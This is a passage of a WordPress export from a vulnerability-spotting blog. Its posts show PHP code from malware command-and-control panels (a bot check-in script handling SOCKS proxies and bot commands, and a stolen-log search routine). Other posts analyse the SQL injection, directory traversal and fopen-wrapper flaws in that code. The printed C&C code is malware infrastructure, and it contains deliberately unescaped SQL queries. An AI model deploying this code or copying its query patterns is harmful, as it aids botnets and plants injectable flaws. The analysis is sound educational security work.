		</wp:postmeta>
	</item>
	<item>
		<title>Feathers</title>
		<link>http://spotthevuln.com/2011/06/feathers/</link>
		<pubDate>Mon, 13 Jun 2011 12:30:17 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1512</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>It is not only fine feathers that make fine birds.
Aesop</strong></blockquote>
<code lang="PHP">
<?php

// Gettin all information
$id = $_GET['id'];
$httpport = $_GET['httpport'];
$socksport = $_GET['socksport'];
$uptimem = $_GET['uptimem'];
$uptimeh = $_GET['uptimeh'];
$param = $_GET['param'];
$ver = $_GET['ver'];
$uid = $_GET['uid'];
$wm = $_GET['wm'];
$lang = $_GET['lang'];
//$ssip = $_GET['ssip'] ;
$ip = getenv("REMOTE_ADDR");
$real_ip = getenv("HTTP_X_FORWARDED_FOR");
$browser = getenv("HTTP_USER_AGENT");

//Security check
if($ver == ''){
	exit;
}

include_once('./mysqllog.php');

//Replace symbols
$id = ereg_replace("<","&#8249",$id);
$id = ereg_replace(">","&#8250",$id);
$id = ereg_replace("\"","&#8221",$id);
$id = ereg_replace(";","",$id);
$id = ereg_replace("%","",$id);
$param = ereg_replace("<","&#8249",$param);
$param = ereg_replace(">","&#8250",$param);
$param = ereg_replace("\"","&#8221",$param);
$param = ereg_replace(";","",$param);
$param = ereg_replace("%","",$param);

/*=========================
$flip = file("logs/cip.dat");
$size  = strlen($flip);
if ($size > 10) {
 	$arr = explode(":", $flip[0]);
 	$aport=311;
}

if($arr[1] == $uid || $arr[1] == "0") {
	$fp = fsockopen($arr[0],$aport, $errno, $errstr, 30); 
	fputs($fp,"IP:$ip PORT:$param $tim SOCKS:$socksport HTTP:$httpport Uptime:$uptimeh:$uptimem lang-$lang uid:$uid id:$id v:$ver\r\n");
	fclose($fp);
}
//=========================*/

$date = date("Y-m-d");
$time=date("H:i:s");
list($year, $month, $day) = explode('-', $date);
$sql_uptime = "$uptimeh:$uptimem";

if($real_ip != "") {
	$fp = fsockopen($real_ip,$socksport, $errno, $errstr, 30); 
	if(!$fp) {
		$okk = false;		
	} else {
		$okk = true;
		
		$link = mysql_connect($mysql_host, $mysql_login, $mysql_pass) or die("Could not connect: " . mysql_error());
		mysql_select_db($mysql_db, $link) or die("Could not select : " . mysql_error());
		$query = 'SELECT COUNT(*) FROM socks where uid = "'. $uid .'"';
		$result = mysql_query($query, $link) or die("Could not execute: " . mysql_error());
		$count = mysql_result($result, 0);
		if ($count == 0) {
			$query = 'INSERT INTO socks VALUES ("'.$uid.'", "'. $real_ip . '", "'. $httpport .'", "'. $socksport . '", "'. $sql_uptime .'", "'. mktime() .'", "0")';
			$result = mysql_query($query, $link) or die("Could not execute: " . mysql_error());
		} else { 
			$query = 'UPDATE socks SET  `ip` = "'. $real_ip .'", `hport` = "'. $httpport .'", `sport` = "'. $socksport .'", `uptime` = "'. $sql_uptime .'", `update` = "'. mktime() .'" WHERE `uid` = "'.$uid.'"';
			$result = mysql_query($query, $link) or die("Could not execute: " . mysql_error());
			$query = 'COMMIT';
			$result = mysql_query($query, $link) or die("Could not execute: " . mysql_error());
		}
		mysql_close($link);

		//$fh=fopen("logs/P.$day.$month.txt","a+");
		//ip:hport:sport:bport:uptime:uid
		//fputs($fh,"$real_ip@$httpport@$socksport@$param@$uptimeh:$uptimem@$uid\r\n");
		//fclose($fh);
		send_command();
		exit;
	}
}

if( ($ip != "") && ($ip != $real_ip) ) {
	$fp = fsockopen($ip,$socksport, $errno, $errstr, 30);
	if(!$fp) {
		send_command();
		exit;
	} else {
		$link = mysql_connect($mysql_host, $mysql_login, $mysql_pass) or die("Could not connect: " . mysql_error());
		mysql_select_db($mysql_db, $link) or die("Could not select : " . mysql_error());
		$query = 'SELECT COUNT(*) FROM socks where uid = "'. $uid .'"';
		$result = mysql_query($query, $link) or die("Could not execute: " . mysql_error());
		$count = mysql_result($result, 0);
		if ($count == 0) {
			$query = 'INSERT INTO socks VALUES ("'.$uid.'", "'. $ip . '", "'. $httpport .'", "'. $socksport . '", "'. $sql_uptime .'", "'. mktime() .'", "0")';
			$result = mysql_query($query, $link) or die("Could not execute: " . mysql_error());
		} else { 
			$query = 'UPDATE socks SET  `ip` = "'. $ip .'", `hport` = "'. $httpport .'", `sport` = "'. $socksport .'", `uptime` = "'. $sql_uptime .'", `update` = "'. mktime() .'" WHERE `uid` = "'.$uid.'"';
			$result = mysql_query($query, $link) or die("Could not execute: " . mysql_error());
			$query = 'COMMIT';
			$result = mysql_query($query, $link) or die("Could not execute: " . mysql_error());
		}
		mysql_close($link);

		//$fh=fopen("logs/P.$day.$month.txt","a+");
		//ip:hport:sport:bport:uptime:uid
		//fputs($fh,"$ip@$httpport@$socksport@$param@$uptimeh:$uptimem@$uid\r\n");
		//fclose($fh);
		send_command();
		exit;
	}
}

send_command();
exit;

function send_command() {
$cmdname="logs/cfg.dat";
$cmduid="logs/uid.ini";

if(filesize("$cmduid") == 0) {
	$fh=fopen($cmdname,"r");
	$cfgdata=fread($fh,filesize($cmdname));
	fclose($fh);
	echo "CMND$cfgdata";
	exit;
}

$array=file($cmduid);
$kolvo=count($array);
for($ei=0;$ei<$kolvo;$ei++) {
	$llen=strlen($array[$ei]);
	$llen=$llen-2;
	$array[$ei]=substr($array[$ei],0,$llen);
	if($array[$ei] == $uid) {
		$fh=fopen($cmdname,"r");
		$cfgdata=fread($fh,filesize($cmdname));
		fclose($fh);
		echo "CMND$cfgdata";
		exit;
	}
}
echo "CMND\r\n";
}

?>
</code>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1512</wp:post_id>
		<wp:post_date>2011-06-13 05:30:17</wp:post_date>
		<wp:post_date_gmt>2011-06-13 12:30:17</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>feathers</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>2111</wp:comment_id>
			<wp:comment_author><![CDATA[Code Snippet Vulnerability Code Example &laquo; SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2011/06/feathers-sqli/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2011-06-17 14:31:59</wp:comment_date>
			<wp:comment_date_gmt>2011-06-17 21:31:59</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...]  [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1308346319.5142";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1308550084.2045";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Feathers - SQLi</title>
		<link>http://spotthevuln.com/2011/06/feathers-sqli/</link>
		<pubDate>Fri, 17 Jun 2011 21:31:53 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1518</guid>
		<description></description>
		<content:encoded><![CDATA[<h1>Details</h1>
Affected Software: Corpse C&C

Fixed in Version: Not Patched

Issue Type: SQL Injection

Original Code: <a href="http://spotthevuln.com/2011/06/feathers/">Found Here</a>
<h1>Details</h1>
This week’s bugs are in the CORPSE C&C (in the bsrv.php file).  There are a couple of bugs here, most of them are very straight forward.   Funny stuff first… if $ver is blank, we will fail the “security check”.  So, in order to reach any of these vulns, we have to provide an arbitrary value for $ver.  $ver is set from $_GET[‘ver’], so we have to provide a bsrv.php?ver=pwnd for each request in order to reach the vulnerable code.  It’s rigorous security checks like this that make exploitation difficult.  
<br/>
$id and $param are validated through a manual process (code on line 27 – 36).  I don’t know why the developer didn’t take advantage of built-in escaping routines… but the validation provided here seem to defend against common vulns.  What’s also puzzling, is why the other variables weren’t validated/escaped.  Veteran Spot the Vuln readers have seen this pattern before (escape one variable, miss the next variable) in other software, but for some reason I still find it surprising every time I see it.  Now, let’s get onto the actual bugs.  The most obvious are $uid and $httpport which are set directly from user controlled input ($_GET).  These two variables are then used to build a dynamic SQL statement.  This results in SQL injection.
<br/>
Additionally, $uptimem and $uptimeh are used to set $sql_uptime.  $sql_uptime is then used in a dynamic SQL statement resulting in yet another SQL injection.
$browser is taken from getenv("HTTP_USER_AGENT"), which is attacker controlled (the user agent header in the HTTP request).  Although $browser isn’t used on this page, it’s just asking for trouble :)
<br/>
Upon first glance, it seems like $real_ip and $socksport could be used to reach a SQL injection.  After some more investigation, it is likely that the fsockopen call would probably fail before $real_ip and $socksport could be passed to a dynamic SQL statement.  With that said, $real_ip and $socksport can be still be used to generate a fsockopen request to an arbitrary system (line 59). 
<br/>
<h1>Developers Solution</h1>
<code lang="PHP" highlight="59,67,71,74,98,102,105">
<?php

// Gettin all information
$id = $_GET['id'];
$httpport = $_GET['httpport'];
$socksport = $_GET['socksport'];
$uptimem = $_GET['uptimem'];
$uptimeh = $_GET['uptimeh'];
$param = $_GET['param'];
$ver = $_GET['ver'];
$uid = $_GET['uid'];
$wm = $_GET['wm'];
$lang = $_GET['lang'];
//$ssip = $_GET['ssip'] ;
$ip = getenv("REMOTE_ADDR");
$real_ip = getenv("HTTP_X_FORWARDED_FOR");
$browser = getenv("HTTP_USER_AGENT");

//Security check
if($ver == ''){
	exit;
}

include_once('./mysqllog.php');

//Replace symbols
$id = ereg_replace("<","&#8249",$id);
$id = ereg_replace(">","&#8250",$id);
$id = ereg_replace("\"","&#8221",$id);
$id = ereg_replace(";","",$id);
$id = ereg_replace("%","",$id);
$param = ereg_replace("<","&#8249",$param);
$param = ereg_replace(">","&#8250",$param);
$param = ereg_replace("\"","&#8221",$param);
$param = ereg_replace(";","",$param);
$param = ereg_replace("%","",$param);

/*=========================
$flip = file("logs/cip.dat");
$size  = strlen($flip);
if ($size > 10) {
 	$arr = explode(":", $flip[0]);
 	$aport=311;
}

if($arr[1] == $uid || $arr[1] == "0") {
	$fp = fsockopen($arr[0],$aport, $errno, $errstr, 30); 
	fputs($fp,"IP:$ip PORT:$param $tim SOCKS:$socksport HTTP:$httpport Uptime:$uptimeh:$uptimem lang-$lang uid:$uid id:$id v:$ver\r\n");
	fclose($fp);
}
//=========================*/

$date = date("Y-m-d");
$time=date("H:i:s");
list($year, $month, $day) = explode('-', $date);
$sql_uptime = "$uptimeh:$uptimem";

if($real_ip != "") {
	$fp = fsockopen($real_ip,$socksport, $errno, $errstr, 30); 
	if(!$fp) {
		$okk = false;		
	} else {
		$okk = true;
		
		$link = mysql_connect($mysql_host, $mysql_login, $mysql_pass) or die("Could not connect: " . mysql_error());
		mysql_select_db($mysql_db, $link) or die("Could not select : " . mysql_error());
		$query = 'SELECT COUNT(*) FROM socks where uid = "'. $uid .'"';
		$result = mysql_query($query, $link) or die("Could not execute: " . mysql_error());
		$count = mysql_result($result, 0);
		if ($count == 0) {
			$query = 'INSERT INTO socks VALUES ("'.$uid.'", "'. $real_ip . '", "'. $httpport .'", "'. $socksport . '", "'. $sql_uptime .'", "'. mktime() .'", "0")';
			$result = mysql_query($query, $link) or die("Could not execute: " . mysql_error());
		} else { 
			$query = 'UPDATE socks SET  `ip` = "'. $real_ip .'", `hport` = "'. $httpport .'", `sport` = "'. $socksport .'", `uptime` = "'. $sql_uptime .'", `update` = "'. mktime() .'" WHERE `uid` = "'.$uid.'"';
			$result = mysql_query($query, $link) or die("Could not execute: " . mysql_error());
			$query = 'COMMIT';
			$result = mysql_query($query, $link) or die("Could not execute: " . mysql_error());
		}
		mysql_close($link);

		//$fh=fopen("logs/P.$day.$month.txt","a+");
		//ip:hport:sport:bport:uptime:uid
		//fputs($fh,"$real_ip@$httpport@$socksport@$param@$uptimeh:$uptimem@$uid\r\n");
		//fclose($fh);
		send_command();
		exit;
	}
}

if( ($ip != "") && ($ip != $real_ip) ) {
	$fp = fsockopen($ip,$socksport, $errno, $errstr, 30);
	if(!$fp) {
		send_command();
		exit;
	} else {
		$link = mysql_connect($mysql_host, $mysql_login, $mysql_pass) or die("Could not connect: " . mysql_error());
		mysql_select_db($mysql_db, $link) or die("Could not select : " . mysql_error());
		$query = 'SELECT COUNT(*) FROM socks where uid = "'. $uid .'"';
		$result = mysql_query($query, $link) or die("Could not execute: " . mysql_error());
		$count = mysql_result($result, 0);
		if ($count == 0) {
			$query = 'INSERT INTO socks VALUES ("'.$uid.'", "'. $ip . '", "'. $httpport .'", "'. $socksport . '", "'. $sql_uptime .'", "'. mktime() .'", "0")';
			$result = mysql_query($query, $link) or die("Could not execute: " . mysql_error());
		} else { 
			$query = 'UPDATE socks SET  `ip` = "'. $ip .'", `hport` = "'. $httpport .'", `sport` = "'. $socksport .'", `uptime` = "'. $sql_uptime .'", `update` = "'. mktime() .'" WHERE `uid` = "'.$uid.'"';
			$result = mysql_query($query, $link) or die("Could not execute: " . mysql_error());
			$query = 'COMMIT';
			$result = mysql_query($query, $link) or die("Could not execute: " . mysql_error());
		}
		mysql_close($link);

		//$fh=fopen("logs/P.$day.$month.txt","a+");
		//ip:hport:sport:bport:uptime:uid
		//fputs($fh,"$ip@$httpport@$socksport@$param@$uptimeh:$uptimem@$uid\r\n");
		//fclose($fh);
		send_command();
		exit;
	}
}

send_command();
exit;

function send_command() {
$cmdname="logs/cfg.dat";
$cmduid="logs/uid.ini";

if(filesize("$cmduid") == 0) {
	$fh=fopen($cmdname,"r");
	$cfgdata=fread($fh,filesize($cmdname));
	fclose($fh);
	echo "CMND$cfgdata";
	exit;
}

$array=file($cmduid);
$kolvo=count($array);
for($ei=0;$ei<$kolvo;$ei++) {
	$llen=strlen($array[$ei]);
	$llen=$llen-2;
	$array[$ei]=substr($array[$ei],0,$llen);
	if($array[$ei] == $uid) {
		$fh=fopen($cmdname,"r");
		$cfgdata=fread($fh,filesize($cmdname));
		fclose($fh);
		echo "CMND$cfgdata";
		exit;
	}
}
echo "CMND\r\n";
}

?>
</code>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1518</wp:post_id>
		<wp:post_date>2011-06-17 14:31:53</wp:post_date>
		<wp:post_date_gmt>2011-06-17 21:31:53</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>feathers-sqli</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>State</title>
		<link>http://spotthevuln.com/2011/06/stat/</link>
		<pubDate>Mon, 20 Jun 2011 12:30:24 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1524</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>State Legislators are merely politicians whose darkest secret prevents them from running for a higher office.
Dennis Miller</strong></blockquote>
<code lang="PHP">
<?php
...snip...
function srch( )
{
    set_time_limit( 0 );
    $word = $_REQUEST['word'];
    $word2 = $word;
    $logfolder = $_REQUEST['infile'];
    $arch = $_REQUEST['xxx'];
    if ( $word != "" )
    {
        $word = explode( "\r\n", $word );
        $wordc = count( $word );
        $hl9 = fopen( $logfolder."/.out.txt", "w" );
        fclose( $hl9 );
        $dir = opendir( $logfolder );
        $finded = "";
        while ( $file = readdir( $dir ) )
        {
            if ( !( $file != "." ) || !( $file != ".." ) || !( $file != ".out.txt" ) || !( substr( $file, -4 ) == ".txt" ) )
            {
                $hl = fopen( $logfolder."/".$file, "rb" );
                $readsz = filesize( $logfolder."/".$file );
                if ( $readsz < 1041076 )
                {
                    $readszR = $readsz;
                }
                else
                {
                    $readszR = 1041076;
                    $readsz -= 1041076;
                }
                while ( $data = fread( $hl, $readszR ) )
                {
                    $pos = 0;
                    $posC = 0;
                    $posS = 0;
                    while ( $pos = strpos( $data, "[IP:", $pos ) )
                    {
                        $pos = strpos( $data, "]", $pos ) + 1;
                        if ( $pos < $posC )
                        {
                            break;
                        }
                        else
                        {
                            $posC = $pos;
                            $lent = $pos - $posS;
                            unset( $cutblock );
                            $cutblock = substr( $data, $posS, $lent );
                            $rd = 0;
                            for ( ; $rd < $wordc; ++$rd )
                            {
                            }
                            if ( !( $word[$rd] != "" ) || !( $ftmp = strpos( $cutblock, $word[$rd], 0 ) ) )
                            {
                                $hl9 = fopen( $logfolder."/.out.txt", "ab+" );
                                fwrite( $hl9, $cutblock );
                                fclose( $hl9 );
                            }
                        }
                        unset( $rd );
                        unset( $lent );
                        unset( $ftmp );
                        unset( $cutblock );
                        $posS = $pos;
                    }
                    unset( $data );
                    if ( $readsz < 1041076 )
                    {
                        $readszR = $readsz;
                    }
                    else
                    {
                        $readszR = 1041076;
                        $readsz -= 1041076;
                    }
                }
                unset( $data );
                fclose( $hl );
            }
        }
        if ( 0 < filesize( $logfolder."/.out.txt" ) )
        {
            $hl9 = fopen( $logfolder."/.out.txt", "r" );
            $finded = fread( $hl9, filesize( $logfolder."/.out.txt" ) );
            fclose( $hl9 );
            if ( $arch == 1 )
            {
                header( "Content-type: application/octet-stream" );
                $cl_Zip = new cl_zip( );
                $cl_Zip->onaddfile( $finded, "log".time( ).".txt" );
                header( "Content-Length: ".strlen( $cl_Zip->ondumpfileout( ) ) );
                header( "Content-disposition: attachment; filename=log".time( ).".zip" );
                echo $cl_Zip->ondumpfileout( );
                exit( );
            }
            return $finded;
        }
    }
}
...snip...
?>
</code>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1524</wp:post_id>
		<wp:post_date>2011-06-20 05:30:24</wp:post_date>
		<wp:post_date_gmt>2011-06-20 12:30:24</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>stat</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>2116</wp:comment_id>
			<wp:comment_author><![CDATA[Defense In Depth, PHP, Solution Vulnerability Code Example &laquo; SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2011/06/state-defense-in-depth/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2011-06-24 23:47:47</wp:comment_date>
			<wp:comment_date_gmt>2011-06-25 06:47:47</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...]  [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:14:"1309546438.701";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1308984467.2574";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>2115</wp:comment_id>
			<wp:comment_author><![CDATA[Mark]]></wp:comment_author>
			<wp:comment_author_email>me@markthomsen.org</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>216.81.94.68</wp:comment_author_IP>
			<wp:comment_date>2011-06-24 10:28:29</wp:comment_date>
			<wp:comment_date_gmt>2011-06-24 17:28:29</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[Looking forward to this week's solution! :)]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1308984194.6595";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1308936510.5035";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>State - Defense in Depth</title>
		<link>http://spotthevuln.com/2011/06/state-defense-in-depth/</link>
		<pubDate>Sat, 25 Jun 2011 06:47:41 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1527</guid>
		<description></description>
		<content:encoded><![CDATA[<h1>Details</h1>
Affected Software: Adrenalin C&C

Fixed in Version: Not Patched

Issue Type: Defense in Depth

Original Code: <a href="http://spotthevuln.com/2011/06/stat/">Found Here</a>
<h1>Details</h1>
First, I’ll talk about a couple of interesting things about this bug that cannot be seen from just the code sample.  When I received this sample, it was encoded with Zend Guard.  While the Zend Guard encoding was easily defeated, it is interesting to see that these malware authors are interested in protecting their intellectual property.  Once again, the malware industry doesn’t get a magical free pass on all the things traditional development shops face.  Monetizing, feature requests, protecting IP, and even security problems are issues all dev shops face.
<br/>
After the code was decoded, it was quickly apparent that this file contained several routines for dealing with uploding files to the web C&C.  I pulled out a routine that I thought was particularly interesting for this week’s code sample.  The sample takes several variables from user/attacker controlled parameters (lines 6, 8, and 9).  One of these variables ($logfolder) is passed directly to fopen().  Fopen is an interesting API.  In this code sample, fopen() is intended to open a file from the local filesystem.  There is no directory traversal check for $logfolder, so the attacker is free to pass a simple ../../../ in the $logfolder variable and control where the txt file gets written to.  In addition to directory traversal bugs, fopen() can actually open more than just local files.  fopen()supports a number of schemes such as: http://, ftp://, php://, ssh2://, and several others.  A full list of protocols supported by fopen() can be found here:  http://www.php.net/manual/en/wrappers.php.  Because the $logfolder variable is the first variable passed to fopen(), the attacker can supply any of these protocols to fopen().  Using these protocols, the attacker can cause the C&C to make arbitrary requests to external servers.  Full compromise of theC&C web server would be difficult, but information leakage can definitely be accomplished.
<br/>
<h1>Vulnerable Code</h1>
<code lang="PHP" highlight="14">
<?php
...snip...
function srch( )
{
    set_time_limit( 0 );
    $word = $_REQUEST['word'];
    $word2 = $word;
    $logfolder = $_REQUEST['infile'];
    $arch = $_REQUEST['xxx'];
    if ( $word != "" )
    {
        $word = explode( "\r\n", $word );
        $wordc = count( $word );
        $hl9 = fopen( $logfolder."/.out.txt", "w" );
        fclose( $hl9 );
        $dir = opendir( $logfolder );
        $finded = "";
        while ( $file = readdir( $dir ) )
        {
            if ( !( $file != "." ) || !( $file != ".." ) || !( $file != ".out.txt" ) || !( substr( $file, -4 ) == ".txt" ) )
            {
                $hl = fopen( $logfolder."/".$file, "rb" );
                $readsz = filesize( $logfolder."/".$file );
                if ( $readsz < 1041076 )
                {
                    $readszR = $readsz;
                }
                else
                {
                    $readszR = 1041076;
                    $readsz -= 1041076;
                }
                while ( $data = fread( $hl, $readszR ) )
                {
                    $pos = 0;
                    $posC = 0;
                    $posS = 0;
                    while ( $pos = strpos( $data, "[IP:", $pos ) )
                    {
                        $pos = strpos( $data, "]", $pos ) + 1;
                        if ( $pos < $posC )
                        {
                            break;
                        }
                        else
                        {
                            $posC = $pos;
                            $lent = $pos - $posS;
                            unset( $cutblock );
                            $cutblock = substr( $data, $posS, $lent );
                            $rd = 0;
                            for ( ; $rd < $wordc; ++$rd )
                            {
                            }
                            if ( !( $word[$rd] != "" ) || !( $ftmp = strpos( $cutblock, $word[$rd], 0 ) ) )
                            {
                                $hl9 = fopen( $logfolder."/.out.txt", "ab+" );
                                fwrite( $hl9, $cutblock );
                                fclose( $hl9 );
                            }
                        }
                        unset( $rd );
                        unset( $lent );
                        unset( $ftmp );
                        unset( $cutblock );
                        $posS = $pos;
                    }
                    unset( $data );
                    if ( $readsz < 1041076 )
                    {
                        $readszR = $readsz;
                    }
                    else
                    {
                        $readszR = 1041076;
                        $readsz -= 1041076;
                    }
                }
                unset( $data );
                fclose( $hl );
            }
        }
        if ( 0 < filesize( $logfolder."/.out.txt" ) )
        {
            $hl9 = fopen( $logfolder."/.out.txt", "r" );
            $finded = fread( $hl9, filesize( $logfolder."/.out.txt" ) );
            fclose( $hl9 );
            if ( $arch == 1 )
            {
                header( "Content-type: application/octet-stream" );
                $cl_Zip = new cl_zip( );
                $cl_Zip->onaddfile( $finded, "log".time( ).".txt" );
                header( "Content-Length: ".strlen( $cl_Zip->ondumpfileout( ) ) );
                header( "Content-disposition: attachment; filename=log".time( ).".zip" );
                echo $cl_Zip->ondumpfileout( );
                exit( );
            }
            return $finded;
        }
    }
}
...snip...
?>
</code>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1527</wp:post_id>
		<wp:post_date>2011-06-24 23:47:41</wp:post_date>
		<wp:post_date_gmt>2011-06-25 06:47:41</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>state-defense-in-depth</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="defense-in-depth"><![CDATA[Defense In Depth]]></category>
